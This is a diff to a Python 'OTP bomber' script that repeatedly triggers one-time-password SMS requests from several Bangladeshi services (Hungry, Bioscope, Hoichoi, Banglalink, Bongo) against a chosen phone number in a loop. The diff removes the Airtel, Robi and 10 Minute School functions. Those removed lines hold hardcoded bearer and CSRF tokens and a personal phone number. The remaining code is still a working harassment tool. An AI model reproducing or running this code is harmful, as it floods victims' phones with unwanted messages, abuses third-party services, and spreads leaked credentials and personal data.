@@ -31,43 +31,7 @@ def hungry():
 	print("====>OTP from hungry")
 	print(x.text)
 
-def airtel():
-	header = {
-	"Host": "api.bd.airtel.com",
-	"User-Agent": "Mozilla/5.0 (Android 11; Mobile; rv:83.0) Gecko/83.0 Firefox/83.0",
-	"Accept": "application/json, text/plain, */*",
-	"Accept-Language": "en-US,en;q=0.5",
-	"Accept-Encoding": "gzip, deflate, br",
-	"Referer": "https://www.bd.airtel.com/en/auth/login",
-	"X-CSRF-TOKEN": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLmJkLmFpcnRlbC5jb21cL3YxXC90b2tlbiIsImlhdCI6MTYyNzY1NjA1NSwiZXhwIjoxNjI3NzQyNDU1LCJuYmYiOjE2Mjc2NTYwNTUsImp0aSI6IlJ0MHFPMll2TVhmMzllUVIiLCJzdWIiOiJBaXJ0ZWwifQ.hwbjXt_q6TL7F4PAyX2rqgBMNbn1BDZChdKi2Ollysw",
-	"Content-Type": "application/json;charset=utf-8",
-	"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLmJkLmFpcnRlbC5jb21cL3YxXC90b2tlbiIsImlhdCI6MTYyNzY1NjA1NSwiZXhwIjoxNjI3NzQyNDU1LCJuYmYiOjE2Mjc2NTYwNTUsImp0aSI6IlJ0MHFPMll2TVhmMzllUVIiLCJzdWIiOiJBaXJ0ZWwifQ.hwbjXt_q6TL7F4PAyX2rqgBMNbn1BDZChdKi2Ollysw",
-	"Content-Length": "30",
-	"Origin": "https://www.bd.airtel.com",
-	"DNT": "1",
-	"Connection": "keep-alive",
-	"Pragma": "no-cache",
-	"Cache-Control": "no-cache",
-			}
 
-
-	json = {"phone_number":number}
-	link = "https://api.bd.airtel.com/v1/account/register/otp"
-
-	x = requests.post(link,json=json,headers=header)
-		
-	print("====>OTP from airtel")
-
-def robi():
-	header = {
-		"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvd2ViYXBpLnJvYmkuY29tLmJkXC92MVwvdG9rZW4iLCJpYXQiOjE2Mjc2OTgxNzAsImV4cCI6MTYyNzc4NDU3MCwibmJmIjoxNjI3Njk4MTcwLCJqdGkiOiJydmpNN1pma21aSHVjZEtGIiwic3ViIjoiUm9iaVdlYlNpdGUifQ.J9U_RcwUeaiL3_OhUereycDDpb20VJxuQuIWwWwwDXo"
-			}
-
-
-	json = {"phone_number":number}
-	link = "https://webapi.robi.com.bd/v1/account/register/otp"
-	x = requests.post(link,json=json,headers=header)
-	print("====>OTP from robi")
 def bongo():
 	link = "https://api2.bongobd.com/api/login/send-otp"
 
@@ -93,16 +57,6 @@ def bl():
 	x = requests.post(link,json=json,headers=header)
 	print("====>OTP from bl")
 	print(x.text)
-def tenmin():
-	link = "https://lms.10minuteschool.com/api/v4/auth/sendOtp"
-
-	json = {"contact":"plusintnumber","phone":{"countryCode":"BD","dialCode":"+880","e164Number":"+8801521798713","internationalNumber":"+880 1521-798713","nationalNumber":"01521-798713","number":"1521-798713"},"type":"phone"}
-
-	x = requests.post(link,data=json)
-	print("====>OTP from 10minuteschool")
-	print(x.text)
-
-
 def bioscope():
 	link="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
 	x = requests.get(link)
@@ -139,10 +93,7 @@ def hoichoi():
 
 for i in range(count):
 	hungry()
-	tenmin()
 	bioscope()
 	hoichoi()
-	airtel()
 	bl()
 	bongo()
-	robi()
